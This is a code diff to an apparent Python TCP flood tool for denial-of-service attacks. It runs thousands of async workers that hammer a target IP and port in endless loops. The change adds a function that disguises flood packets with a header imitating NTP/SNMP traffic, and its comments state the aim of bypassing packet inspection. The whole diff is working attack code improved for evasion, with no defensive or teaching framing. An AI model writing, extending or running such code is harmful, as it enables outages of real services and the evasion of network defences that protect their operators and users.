@@ -7,6 +7,13 @@ import sys
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
+def generate_smart_payload(size):
+    # Differentiating the header so the packet resembles NTP/SNMP
+    header = b'\x17\x00\x03\x2a' + b'\x00' * 4
+    if size <= len(header):
+        return header[:size]
+    return header + random.randbytes(size - len(header))
+
 async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
 	while True:
 		try:
@@ -68,8 +75,8 @@ async def main():
 	threads = int(input("Insert number of async workers (e.g. 5000): ").strip())
 	packet_size = int(input("Insert Payload Size in bytes (default 1024): ") or "1024")
 	
-	# Generate random garbage payload to bypass simple packet inspection
-	payload = random.randbytes(packet_size)
+	# Generate smart payload to bypass simple packet inspection
+	payload = generate_smart_payload(packet_size)
 	
 	# Massive concurrency limit for L4 (OS network stack limit)
 	conn_limit = min(threads, 20000)
